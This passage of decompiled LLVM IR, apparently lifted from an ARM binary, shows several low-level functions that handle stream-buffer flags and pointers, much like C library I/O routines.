  %v0_183b4 = load i32, i32* @fp, align 4
  %v2_183b4 = add i32 %v0_183b4, 60
  %v3_183b4 = inttoptr i32 %v2_183b4 to i32*
  %v4_183b4 = load i32, i32* %v3_183b4, align 4
  store i32 %v4_183b4, i32* %r3.global-to-local, align 4
  %v2_183b8 = load i32, i32* @sb, align 4
  %v3_183b8 = add i32 %v2_183b8, 2
  %v4_183b8 = inttoptr i32 %v3_183b8 to i8*
  store i8 0, i8* %v4_183b8, align 1
  %v0_183bc = load i32, i32* @sb, align 4
  %v1_183bc = inttoptr i32 %v0_183bc to i16*
  %v2_183bc = load i16, i16* %v1_183bc, align 2
  %v3_183bc = zext i16 %v2_183bc to i32
  store i32 %v3_183bc, i32* @r2, align 4
  %v0_183c0 = load i32, i32* %r3.global-to-local, align 4
  %v1_183c0 = inttoptr i32 %v0_183c0 to i32*
  %v2_183c0 = load i32, i32* %v1_183c0, align 4
  store i32 %v2_183c0, i32* %r1.global-to-local, align 4
  %v1_183c4 = add i32 %v0_183bc, 8
  %v2_183c4 = inttoptr i32 %v1_183c4 to i32*
  %v3_183c4 = load i32, i32* %v2_183c4, align 4
  store i32 %v3_183c4, i32* %r3.global-to-local, align 4
  %v1_183c8 = and i32 %v3_183bc, 8192
  %v2_183c8 = icmp eq i32 %v1_183c8, 0
  %v2_183cc = add i32 %v0_183bc, 20
  %v3_183cc = inttoptr i32 %v2_183cc to i32*
  store i32 %v3_183c4, i32* %v3_183cc, align 4
  %v0_183d0 = load i32, i32* %r0.global-to-local, align 4
  %v1_183d0 = load i32, i32* @sb, align 4
  %v2_183d0 = add i32 %v1_183d0, 44
  %v3_183d0 = inttoptr i32 %v2_183d0 to i32*
  store i32 %v0_183d0, i32* %v3_183d0, align 4
  %v0_183d4 = load i32, i32* %r1.global-to-local, align 4
  %v1_183d4 = load i32, i32* @sb, align 4
  %v2_183d4 = add i32 %v1_183d4, 52
  %v3_183d4 = inttoptr i32 %v2_183d4 to i32*
  store i32 %v0_183d4, i32* %v3_183d4, align 4
  %v0_183d8 = load i32, i32* %r3.global-to-local, align 4
  %v1_183d8 = load i32, i32* @sb, align 4
  %v2_183d8 = add i32 %v1_183d8, 24
  %v3_183d8 = inttoptr i32 %v2_183d8 to i32*
  store i32 %v0_183d8, i32* %v3_183d8, align 4
  %v0_183dc = load i32, i32* %r3.global-to-local, align 4
  %v1_183dc = load i32, i32* @sb, align 4
  %v2_183dc = add i32 %v1_183dc, 28
  %v3_183dc = inttoptr i32 %v2_183dc to i32*
  store i32 %v0_183dc, i32* %v3_183dc, align 4
  %v0_183e0 = load i32, i32* %r3.global-to-local, align 4
  %v1_183e0 = load i32, i32* @sb, align 4
  %v2_183e0 = add i32 %v1_183e0, 16
  %v3_183e0 = inttoptr i32 %v2_183e0 to i32*
  store i32 %v0_183e0, i32* %v3_183e0, align 4
  br i1 %v2_183c8, label %dec_label_pc_1849c, label %dec_label_pc_183e8

dec_label_pc_183e8:                               ; preds = %bb40
  store i32 36, i32* %r3.global-to-local, align 4
  %v0_183ec = load i32, i32* @fp, align 4
  %v2_183ec = add i32 %v0_183ec, 36
  %v3_183ec = inttoptr i32 %v2_183ec to i32*
  %v4_183ec = load i32, i32* %v3_183ec, align 4
  store i32 %v4_183ec, i32* %r8.global-to-local, align 4
  store i32 116, i32* %r3.global-to-local, align 4
  %v2_183f4 = add i32 %v0_183ec, 116
  %v3_183f4 = inttoptr i32 %v2_183f4 to i32*
  %v4_183f4 = load i32, i32* %v3_183f4, align 4
  store i32 %v4_183f4, i32* %r4.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v2_183fc = ptrtoint i32* %stack_var_-56 to i32
  %v2_18400 = add i32 %v0_183ec, 76
  %v3_18400 = inttoptr i32 %v2_18400 to i32*
  %v4_18400 = load i32, i32* %v3_18400, align 4
  store i32 %v4_183ec, i32* %r1.global-to-local, align 4
  store i32 %v4_183f4, i32* %r2.global-to-local, align 4
  store i32 %v2_183fc, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_18400)
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_1841c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1841c, i32* %r0.global-to-local, align 4
  %v0_18420 = load i32, i32* @fp, align 4
  %v2_18420 = add i32 %v0_18420, 16
  %v3_18420 = inttoptr i32 %v2_18420 to i32*
  %v4_18420 = load i32, i32* %v3_18420, align 4
  call void @__pseudo_branch(i32 %v4_18420)
  store i32 104, i32* %r3.global-to-local, align 4
  %v0_18430 = load i32, i32* @fp, align 4
  %v2_18430 = add i32 %v0_18430, 104
  %v3_18430 = inttoptr i32 %v2_18430 to i32*
  %v4_18430 = load i32, i32* %v3_18430, align 4
  store i32 %v4_18430, i32* %r4.global-to-local, align 4
  %v0_18434 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_18434, i32* %r1.global-to-local, align 4
  store i32 %v4_18430, i32* %r2.global-to-local, align 4
  store i32 %v2_181ec, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_18400)
  store i32 %v4_18430, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_18420)
  store i32 48, i32* %r3.global-to-local, align 4
  %v0_18458 = load i32, i32* @fp, align 4
  %v2_18458 = add i32 %v0_18458, 48
  %v3_18458 = inttoptr i32 %v2_18458 to i32*
  %v4_18458 = load i32, i32* %v3_18458, align 4
  store i32 %v4_18458, i32* @ip, align 4
  store i32 24, i32* %r3.global-to-local, align 4
  %v1_18460 = inttoptr i32 %v4_18458 to i32*
  %v2_18460 = load i32, i32* %v1_18460, align 4
  store i32 %v2_18460, i32* @r2, align 4
  store i32 %v2_181ec, i32* %r0.global-to-local, align 4
  %v1_18468 = load i32, i32* @sb, align 4
  %v2_18468 = add i32 %v1_18468, 32
  %v3_18468 = inttoptr i32 %v2_18468 to i32*
  store i32 %v2_18460, i32* %v3_18468, align 4
  %v0_1846c = load i32, i32* @fp, align 4
  %v1_1846c = load i32, i32* %r3.global-to-local, align 4
  %v2_1846c = add i32 %v1_1846c, %v0_1846c
  %v3_1846c = inttoptr i32 %v2_1846c to i32*
  %v4_1846c = load i32, i32* %v3_1846c, align 4
  store i32 %v4_1846c, i32* %r4.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_18474 = load i32, i32* @sb, align 4
  %v1_18474 = load i32, i32* @ip, align 4
  %v2_18474 = inttoptr i32 %v1_18474 to i32*
  store i32 %v0_18474, i32* %v2_18474, align 4
  call void @__pseudo_branch(i32 %v4_1846c)
  store i32 %v2_183fc, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_1846c)
  br label %dec_label_pc_1849c

dec_label_pc_18498:                               ; preds = %dec_label_pc_1822c, %dec_label_pc_18218, %dec_label_pc_18238
  store i32 0, i32* @sb, align 4
  br label %dec_label_pc_1849c

dec_label_pc_1849c:                               ; preds = %bb40, %dec_label_pc_18270, %dec_label_pc_183e8, %dec_label_pc_18498
  %v0_1849c = load i32, i32* @sb, align 4
  store i32 %v0_1849c, i32* %r0.global-to-local, align 4
  %v2_184a4 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_184a4, i32* @r4, align 4
  store i32 %v6_181d8, i32* @r5, align 4
  store i32 %v9_181d8, i32* @r6, align 4
  store i32 %v18_181d8, i32* @sb, align 4
  store i32 %v24_181d8, i32* @fp, align 4
  ret i32 %v0_1849c

; uselistorder directives
  uselistorder i32 %v1_1839c.pre, { 2, 1, 0 }
  uselistorder i32 %v0_18330, { 1, 2, 0 }
  uselistorder i32 %v0_182fc, { 1, 0 }
  uselistorder i32 %v1_182c0, { 1, 0 }
  uselistorder i32 %v0_182c0, { 1, 0 }
  uselistorder i32 %v1_182a8, { 1, 0, 2 }
  uselistorder i32 %v1_18260, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 0, 25, 26 }
  uselistorder i32* %r0.global-to-local, { 0, 2, 1, 4, 3, 5, 6, 7, 8, 10, 9, 19, 12, 11, 14, 13, 20, 16, 15, 17, 18 }
  uselistorder i32 16384, { 12, 11, 0, 6, 5, 3, 4, 1, 2, 7, 8, 9, 10 }
  uselistorder i32 (i32)* @function_145ac, { 0, 2, 1 }
  uselistorder i32 2147483647, { 0, 1, 6, 2, 5, 3, 4 }
  uselistorder i32 (i32, i32)* @function_125b4, { 3, 0, 4, 2, 1 }
  uselistorder i32 131072, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @function_128a0, { 1, 10, 0, 9, 8, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 80, { 0, 2, 3, 4, 5, 1 }
  uselistorder i8 114, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_1849c, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_18498, { 2, 0, 1 }
  uselistorder label %bb40, { 2, 0, 1 }
  uselistorder label %dec_label_pc_18378, { 1, 0 }
  uselistorder label %.thread5, { 1, 0 }
  uselistorder label %bb38, { 1, 0 }
  uselistorder label %dec_label_pc_182f0._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_18298, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_18248, { 2, 1, 0 }
  uselistorder label %dec_label_pc_18218, { 1, 2, 0 }
}

define i32 @function_184b0(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_184b0:
  %tmp = ptrtoint i16* %arg1 to i32
  %v0_184b0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_184b0, label %bb, label %.thread10

bb:                                               ; preds = %dec_label_pc_184b0
  %v3_184b8 = and i32 %arg4, %arg3
  %v2_184bc = trunc i32 %v3_184b8 to i16
  %v4_184bc = inttoptr i32 %v3_184b8 to i16*
  store i16 %v2_184bc, i16* %v4_184bc, align 2
  br label %.thread10

.thread10:                                        ; preds = %dec_label_pc_184b0, %bb
  %v10_184dc = phi i32 [ %tmp, %dec_label_pc_184b0 ], [ 0, %bb ]
  ret i32 %v10_184dc

; uselistorder directives
  uselistorder i32 %v3_184b8, { 1, 0 }
  uselistorder label %.thread10, { 1, 0 }
}

define i32 @function_184e0(i32 %arg1, i32 %arg2, i16* %arg3) local_unnamed_addr {
dec_label_pc_184e0:
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg3 to i32
  %stack_var_-20 = alloca i32, align 4
  %v3_184e0 = load i32, i32* @r4, align 4
  store i32 %v3_184e0, i32* %stack_var_-20, align 4
  %v6_184e0 = load i32, i32* @r5, align 4
  %v9_184e0 = load i32, i32* @r6, align 4
  %v12_184e0 = load i32, i32* @r7, align 4
  %v3_184e4 = load i16, i16* %arg3, align 2
  %v4_184e4 = zext i16 %v3_184e4 to i32
  %v1_184e8 = and i32 %v4_184e4, 512
  store i32 %v1_184e8, i32* @r4, align 4
  %v2_184e8 = icmp eq i32 %v1_184e8, 0
  store i32 %tmp, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_184e8, label %dec_label_pc_18500, label %dec_label_pc_185fc

dec_label_pc_18500:                               ; preds = %dec_label_pc_184e0
  %v2_18500 = add i32 %tmp, 4
  %v3_18500 = inttoptr i32 %v2_18500 to i32*
  %v4_18500 = load i32, i32* %v3_18500, align 4
  %v2_18508 = add i32 %tmp, 16
  %v3_18508 = inttoptr i32 %v2_18508 to i32*
  %v4_18508 = load i32, i32* %v3_18508, align 4
  store i32 %v4_18508, i32* @r0, align 4
  %v2_1850c = add i32 %tmp, 12
  %v3_1850c = inttoptr i32 %v2_1850c to i32*
  %v4_1850c = load i32, i32* %v3_1850c, align 4
  store i32 %v4_1850c, i32* @r3, align 4
  %v4_18510 = icmp eq i32 %v4_18500, -2
  %v2_18514 = sub i32 %v4_1850c, %v4_18508
  br i1 %v4_18510, label %dec_label_pc_18514, label %dec_label_pc_1853c

dec_label_pc_18514:                               ; preds = %dec_label_pc_18500
  %v3_18518 = icmp ugt i32 %v2_18514, %arg2
  br i1 %v3_18518, label %bb, label %bb12

bb:                                               ; preds = %dec_label_pc_18514
  br label %bb12

bb12:                                             ; preds = %dec_label_pc_18514, %bb
  %storemerge = phi i32 [ %arg2, %bb ], [ %v2_18514, %dec_label_pc_18514 ]
  %v0_18520 = phi i32 [ %arg2, %bb ], [ %v2_18514, %dec_label_pc_18514 ]
  store i32 %storemerge, i32* @r4, align 4
  store i32 %v0_18520, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_18528 = call i32 @function_14000()
  %v0_1852c = load i32, i32* @r5, align 4
  %v1_1852c = add i32 %v0_1852c, 16
  %v2_1852c = inttoptr i32 %v1_1852c to i32*
  %v3_1852c = load i32, i32* %v2_1852c, align 4
  %v1_18530 = load i32, i32* @r4, align 4
  %v2_18530 = add i32 %v1_18530, %v3_1852c
  store i32 %v2_18530, i32* %v2_1852c, align 4
  br label %dec_label_pc_18610

dec_label_pc_1853c:                               ; preds = %dec_label_pc_18500
  store i32 %v2_18514, i32* @r3, align 4
  %tmp18 = icmp ult i32 %v2_18514, %arg2
  br i1 %tmp18, label %dec_label_pc_185dc, label %dec_label_pc_18548

dec_label_pc_18548:                               ; preds = %dec_label_pc_1853c
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_18550 = call i32 @function_14000()
  %v0_18554 = load i32, i32* @r5, align 4
  %v1_18554 = add i32 %v0_18554, 16
  %v2_18554 = inttoptr i32 %v1_18554 to i32*
  %v3_18554 = load i32, i32* %v2_18554, align 4
  %v1_18558 = inttoptr i32 %v0_18554 to i16*
  %v2_18558 = load i16, i16* %v1_18558, align 2
  %v1_1855c = load i32, i32* @r6, align 4
  %v2_1855c = add i32 %v1_1855c, %v3_18554
  %v1_18560 = and i16 %v2_18558, 256
  %v2_18560 = icmp eq i16 %v1_18560, 0
  store i32 %v2_1855c, i32* %v2_18554, align 4
  br i1 %v2_18560, label %dec_label_pc_18610, label %dec_label_pc_1856c

dec_label_pc_1856c:                               ; preds = %dec_label_pc_18548
  %v0_1856c = load i32, i32* @r7, align 4
  %v0_18574 = load i32, i32* @r6, align 4
  %v4_18578 = call i32 @function_19fac(i32 %v0_1856c, i32 10, i32 %v0_18574, i32 %v2_1855c)
  %v2_1857c = icmp eq i32 %v4_18578, 0
  br i1 %v2_1857c, label %dec_label_pc_18610, label %dec_label_pc_18584

dec_label_pc_18584:                               ; preds = %dec_label_pc_1856c
  %v0_18584 = load i32, i32* @r5, align 4
  store i32 %v0_18584, i32* @r0, align 4
  %v0_18588 = call i32 @function_12d98()
  %v2_1858c = icmp eq i32 %v0_18588, 0
  br i1 %v2_1858c, label %dec_label_pc_18610, label %dec_label_pc_18594

dec_label_pc_18594:                               ; preds = %dec_label_pc_18584
  %v1_18594 = load i32, i32* @r6, align 4
  %v3_18594 = icmp uge i32 %v0_18588, %v1_18594
  %v1_18594.v0_18588 = select i1 %v3_18594, i32 %v1_18594, i32 %v0_18588
  store i32 %v1_18594.v0_18588, i32* @r4, align 4
  %v2_185a0 = sub i32 %v1_18594, %v1_18594.v0_18588
  %v0_185a4 = load i32, i32* @r7, align 4
  %v2_185a4 = add i32 %v0_185a4, %v2_185a0
  store i32 %v2_185a4, i32* %r7.global-to-local, align 4
  store i32 %v2_185a4, i32* @r0, align 4
  store i32 %v1_18594.v0_18588, i32* @r2, align 4
  %v4_185b4 = call i32 @function_19d50(i32 %v2_185a4, i32 10, i32 %v1_18594.v0_18588, i32 %v2_185a0)
  %v2_185b8 = icmp eq i32 %v4_185b4, 0
  br i1 %v2_185b8, label %dec_label_pc_18610, label %dec_label_pc_185c0

dec_label_pc_185c0:                               ; preds = %dec_label_pc_18594
  %v0_185c0 = load i32, i32* @r5, align 4
  %v1_185c0 = add i32 %v0_185c0, 16
  %v2_185c0 = inttoptr i32 %v1_185c0 to i32*
  %v3_185c0 = load i32, i32* %v2_185c0, align 4
  %v0_185c4 = load i32, i32* %r7.global-to-local, align 4
  %v1_185c4 = load i32, i32* @r4, align 4
  %v2_185c4 = sub i32 %v0_185c4, %v4_185b4
  %v2_185c8 = add i32 %v2_185c4, %v1_185c4
  %v2_185cc = sub i32 %v3_185c0, %v2_185c8
  %v1_185d0 = load i32, i32* @r6, align 4
  %v2_185d0 = sub i32 %v1_185d0, %v2_185c8
  store i32 %v2_185d0, i32* @r6, align 4
  store i32 %v2_185cc, i32* %v2_185c0, align 4
  br label %dec_label_pc_18610

dec_label_pc_185dc:                               ; preds = %dec_label_pc_1853c
  %v2_185dc = add i32 %tmp, 8
  %v3_185dc = inttoptr i32 %v2_185dc to i32*
  %v4_185dc = load i32, i32* %v3_185dc, align 4
  %v9_185e0 = icmp eq i32 %v4_18508, %v4_185dc
  br i1 %v9_185e0, label %dec_label_pc_185fc, label %dec_label_pc_185e8

dec_label_pc_185e8:                               ; preds = %dec_label_pc_185dc
  store i32 %tmp, i32* @r0, align 4
  %v0_185ec = call i32 @function_12d98()
  %v2_185f0 = icmp eq i32 %v0_185ec, 0
  br i1 %v2_185f0, label %dec_label_pc_185e8.dec_label_pc_185fc_crit_edge, label %bb15

dec_label_pc_185e8.dec_label_pc_185fc_crit_edge:  ; preds = %dec_label_pc_185e8
  %v0_185fc.pre = load i32, i32* @r6, align 4
  %v0_18600.pre = load i32, i32* @r5, align 4
  %v0_18604.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_185fc

bb15:                                             ; preds = %dec_label_pc_185e8
  %v1_185f4 = load i32, i32* @r4, align 4
  store i32 %v1_185f4, i32* @r6, align 4
  br label %dec_label_pc_18610

dec_label_pc_185fc:                               ; preds = %dec_label_pc_185e8.dec_label_pc_185fc_crit_edge, %dec_label_pc_184e0, %dec_label_pc_185dc
  %v0_18604 = phi i32 [ %v0_18604.pre, %dec_label_pc_185e8.dec_label_pc_185fc_crit_edge ], [ %arg1, %dec_label_pc_184e0 ], [ %arg1, %dec_label_pc_185dc ]
  %v0_18600 = phi i32 [ %v0_18600.pre, %dec_label_pc_185e8.dec_label_pc_185fc_crit_edge ], [ %tmp, %dec_label_pc_184e0 ], [ %tmp, %dec_label_pc_185dc ]
  %v0_185fc = phi i32 [ %v0_185fc.pre, %dec_label_pc_185e8.dec_label_pc_185fc_crit_edge ], [ %arg2, %dec_label_pc_184e0 ], [ %arg2, %dec_label_pc_185dc ]
  %v1_18600 = inttoptr i32 %v0_18600 to i16*
  %v5_18608 = call i32 @function_18124(i16* %v1_18600, i32 %v0_18604, i32 %v0_185fc)
  store i32 %v5_18608, i32* @r6, align 4
  br label %dec_label_pc_18610

dec_label_pc_18610:                               ; preds = %bb15, %dec_label_pc_18594, %dec_label_pc_18584, %dec_label_pc_1856c, %dec_label_pc_18548, %dec_label_pc_185c0, %bb12, %dec_label_pc_185fc
  %v0_18610 = load i32, i32* @r6, align 4
  %v2_18618 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_18618, i32* @r4, align 4
  store i32 %v6_184e0, i32* @r5, align 4
  store i32 %v9_184e0, i32* @r6, align 4
  store i32 %v12_184e0, i32* @r7, align 4
  ret i32 %v0_18610

; uselistorder directives
  uselistorder i32 %v2_185c8, { 1, 0 }
  uselistorder i32 %v2_185a0, { 1, 0 }
  uselistorder i32 %v1_18594.v0_18588, { 1, 2, 0, 3 }
  uselistorder i32 %v1_18594, { 1, 0, 2 }
  uselistorder i32 %v2_18514, { 2, 4, 0, 1, 3 }
  uselistorder i32 %tmp, { 0, 1, 2, 3, 5, 4, 6, 7 }
  uselistorder i32 %arg2, { 3, 4, 5, 2, 0, 1, 6, 7 }
  uselistorder i32 %arg1, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_18610, { 7, 0, 5, 1, 2, 3, 4, 6 }
  uselistorder label %dec_label_pc_185fc, { 0, 2, 1 }
  uselistorder label %bb12, { 1, 0 }
}

define i32 @function_18620(i16* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_18620:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_18620 = load i32, i32* @r4, align 4
  store i32 %v3_18620, i32* %stack_var_-8, align 4
  %v3_18624 = load i16, i16* %arg1, align 2
  %v4_18624 = zext i16 %v3_18624 to i32
  %v2_18628 = and i32 %v4_18624, %arg2
  %v4_18628 = icmp eq i32 %v2_18628, 0
  store i32 %tmp, i32* @r4, align 4
  br i1 %v4_18628, label %dec_label_pc_18634, label %dec_label_pc_18644

dec_label_pc_18634:                               ; preds = %dec_label_pc_18620
  %v1_18634 = and i32 %v4_18624, 2176
  %v2_18634 = icmp eq i32 %v1_18634, 0
  br i1 %v2_18634, label %dec_label_pc_1863c, label %dec_label_pc_18650

dec_label_pc_1863c:                               ; preds = %dec_label_pc_18634
  %v2_1863c = or i32 %v4_18624, %arg2
  %v1_18640 = trunc i32 %v2_1863c to i16
  store i16 %v1_18640, i16* %arg1, align 2
  %v0_18644.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_18644

dec_label_pc_18644:                               ; preds = %dec_label_pc_18620, %dec_label_pc_1863c
  %v0_18680 = phi i32 [ %tmp, %dec_label_pc_18620 ], [ %v0_18644.pre, %dec_label_pc_1863c ]
  %v1_18644 = inttoptr i32 %v0_18680 to i16*
  %v2_18644 = load i16, i16* %v1_18644, align 2
  %v3_18644 = zext i16 %v2_18644 to i32
  store i32 %v3_18644, i32* @ip, align 4
  %v1_18648 = and i32 %v3_18644, 32
  %v2_18648 = icmp eq i32 %v1_18648, 0
  br i1 %v2_18648, label %dec_label_pc_18670, label %dec_label_pc_18650

dec_label_pc_18650:                               ; preds = %dec_label_pc_18634, %dec_label_pc_18644
  %v0_18650 = call i32 @function_12b24()
  store i32 %v0_18650, i32* %r0.global-to-local, align 4
  %v2_18658 = inttoptr i32 %v0_18650 to i32*
  store i32 9, i32* %v2_18658, align 4
  br label %dec_label_pc_1865c

dec_label_pc_1865c:                               ; preds = %dec_label_pc_18698, %dec_label_pc_18650
  %v0_1865c = load i32, i32* @r4, align 4
  %v1_1865c = inttoptr i32 %v0_1865c to i16*
  %v2_1865c = load i16, i16* %v1_1865c, align 2
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_18664 = or i16 %v2_1865c, 8
  store i16 %v1_18664, i16* %v1_1865c, align 2
  br label %bb11

dec_label_pc_18670:                               ; preds = %dec_label_pc_18644
  %tmp14 = urem i16 %v2_18644, 4
  %v2_18670 = icmp eq i16 %tmp14, 0
  br i1 %v2_18670, label %dec_label_pc_186cc, label %dec_label_pc_18678

dec_label_pc_18678:                               ; preds = %dec_label_pc_18670
  %v1_18678 = and i32 %v3_18644, 4
  store i32 %v1_18678, i32* @r1, align 4
  %v2_18678 = icmp eq i32 %v1_18678, 0
  br i1 %v2_18678, label %dec_label_pc_18680, label %dec_label_pc_186b0

dec_label_pc_18680:                               ; preds = %dec_label_pc_18678
  %v1_18680 = add i32 %v0_18680, 20
  %v2_18680 = inttoptr i32 %v1_18680 to i32*
  %v3_18680 = load i32, i32* %v2_18680, align 4
  store i32 %v3_18680, i32* %r2.global-to-local, align 4
  %v1_18684 = add i32 %v0_18680, 16
  %v2_18684 = inttoptr i32 %v1_18684 to i32*
  %v3_18684 = load i32, i32* %v2_18684, align 4
  %v9_18688 = icmp eq i32 %v3_18680, %v3_18684
  br i1 %v9_18688, label %dec_label_pc_18690, label %dec_label_pc_18698

dec_label_pc_18690:                               ; preds = %dec_label_pc_18680
  %v1_18690 = and i32 %v3_18644, 2
  %v2_18690 = icmp eq i32 %v1_18690, 0
  br i1 %v2_18690, label %dec_label_pc_186b0, label %dec_label_pc_18698

dec_label_pc_18698:                               ; preds = %dec_label_pc_18680, %dec_label_pc_18690
  %v1_18698 = and i32 %v3_18644, 1024
  %tmp12 = udiv i32 %v1_18698, 1024
  %tmp13 = add nuw nsw i32 %tmp12, 1
  store i32 %tmp13, i32* %r2.global-to-local, align 4
  %v0_186a4 = call i32 @function_1af94()
  store i32 %v0_186a4, i32* %r0.global-to-local, align 4
  %v2_186a8 = icmp eq i32 %v0_186a4, 0
  br i1 %v2_186a8, label %.dec_label_pc_186b0_crit_edge, label %dec_label_pc_1865c

.dec_label_pc_186b0_crit_edge:                    ; preds = %dec_label_pc_18698
  %v0_186b0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_186b0

dec_label_pc_186b0:                               ; preds = %.dec_label_pc_186b0_crit_edge, %dec_label_pc_18678, %dec_label_pc_18690
  %v2_186bc = phi i32 [ %v0_186b0.pre, %.dec_label_pc_186b0_crit_edge ], [ %v0_18680, %dec_label_pc_18678 ], [ %v0_18680, %dec_label_pc_18690 ]
  %v1_186b0 = inttoptr i32 %v2_186bc to i16*
  %v2_186b0 = load i16, i16* %v1_186b0, align 2
  %v1_186b4 = add i32 %v2_186bc, 8
  %v2_186b4 = inttoptr i32 %v1_186b4 to i32*
  %v3_186b4 = load i32, i32* %v2_186b4, align 4
  store i32 %v3_186b4, i32* %r2.global-to-local, align 4
  %v1_186b8 = and i16 %v2_186b0, -4
  store i16 %v1_186b8, i16* %v1_186b0, align 2
  %v0_186c0 = load i32, i32* %r2.global-to-local, align 4
  %v1_186c0 = load i32, i32* @r4, align 4
  %v2_186c0 = add i32 %v1_186c0, 20
  %v3_186c0 = inttoptr i32 %v2_186c0 to i32*
  store i32 %v0_186c0, i32* %v3_186c0, align 4
  %v0_186c4 = load i32, i32* %r2.global-to-local, align 4
  %v1_186c4 = load i32, i32* @r4, align 4
  %v2_186c4 = add i32 %v1_186c4, 24
  %v3_186c4 = inttoptr i32 %v2_186c4 to i32*
  store i32 %v0_186c4, i32* %v3_186c4, align 4
  %v0_186c8 = load i32, i32* %r2.global-to-local, align 4
  %v1_186c8 = load i32, i32* @r4, align 4
  %v2_186c8 = add i32 %v1_186c8, 16
  %v3_186c8 = inttoptr i32 %v2_186c8 to i32*
  store i32 %v0_186c8, i32* %v3_186c8, align 4
  %v0_186cc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_186cc

dec_label_pc_186cc:                               ; preds = %dec_label_pc_18670, %dec_label_pc_186b0
  %v2_186d8 = phi i32 [ %v0_18680, %dec_label_pc_18670 ], [ %v0_186cc.pre, %dec_label_pc_186b0 ]
  %v1_186cc = inttoptr i32 %v2_186d8 to i16*
  %v2_186cc = load i16, i16* %v1_186cc, align 2
  %v3_186cc = zext i16 %v2_186cc to i32
  %v1_186d0 = or i16 %v2_186cc, 64
  %v1_186d4 = and i32 %v3_186cc, 2816
  store i32 %v1_186d4, i32* %r0.global-to-local, align 4
  %v2_186d4 = icmp eq i32 %v1_186d4, 0
  store i16 %v1_186d0, i16* %v1_186cc, align 2
  br i1 %v2_186d4, label %bb10, label %.thread1

bb10:                                             ; preds = %dec_label_pc_186cc
  %v1_186dc = load i32, i32* @r4, align 4
  %v2_186dc = add i32 %v1_186dc, 12
  %v3_186dc = inttoptr i32 %v2_186dc to i32*
  %v4_186dc = load i32, i32* %v3_186dc, align 4
  %v3_186e0 = add i32 %v1_186dc, 28
  %v4_186e0 = inttoptr i32 %v3_186e0 to i32*
  store i32 %v4_186dc, i32* %v4_186e0, align 4
  br label %bb11

.thread1:                                         ; preds = %dec_label_pc_186cc
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb11

bb11:                                             ; preds = %bb10, %dec_label_pc_1865c, %.thread1
  %v2_186e8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_186e8, i32* @r4, align 4
  %v1_186ec = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_186ec

; uselistorder directives
  uselistorder i32 %v2_186bc, { 1, 0 }
  uselistorder i32 %v0_18680, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v4_18624, { 0, 2, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32* %r0.global-to-local, { 3, 1, 2, 0, 4, 5 }
  uselistorder i16* %arg1, { 1, 0, 2 }
  uselistorder label %bb11, { 2, 0, 1 }
  uselistorder label %dec_label_pc_186cc, { 1, 0 }
  uselistorder label %dec_label_pc_186b0, { 0, 2, 1 }
  uselistorder label %dec_label_pc_18698, { 1, 0 }
  uselistorder label %dec_label_pc_18650, { 1, 0 }
  uselistorder label %dec_label_pc_18644, { 1, 0 }
}

define i32 @function_186f0() local_unnamed_addr {
dec_label_pc_186f0:
  %v0_186f0 = load i32, i32* @r2, align 4
  %v1_186f0 = icmp slt i32 %v0_186f0, 0
  %v0_186f4 = load i32, i32* @r0, align 4
  %v1_186f8 = and i32 %v0_186f4, 2048
  %v2_1872c = icmp eq i32 %v1_186f8, 0
  br i1 %v1_186f0, label %dec_label_pc_1872c, label %dec_label_pc_18700

dec_label_pc_18700:                               ; preds = %dec_label_pc_186f0
  br i1 %v2_1872c, label %dec_label_pc_18708, label %dec_label_pc_18734

dec_label_pc_18708:                               ; preds = %dec_label_pc_18700
  %v7_18708 = icmp eq i32 %v0_186f4, 256
  %v0_1870c = load i32, i32* @r1, align 4
  %v1_1870c = inttoptr i32 %v0_1870c to i32*
  %v2_1870c = load i32, i32* %v1_1870c, align 4
  %v2_18710 = urem i32 %v2_1870c, 256
  %v2_18710.v2_1870c = select i1 %v7_18708, i32 %v2_18710, i32 %v2_1870c
  br i1 %v7_18708, label %.thread, label %dec_label_pc_18718

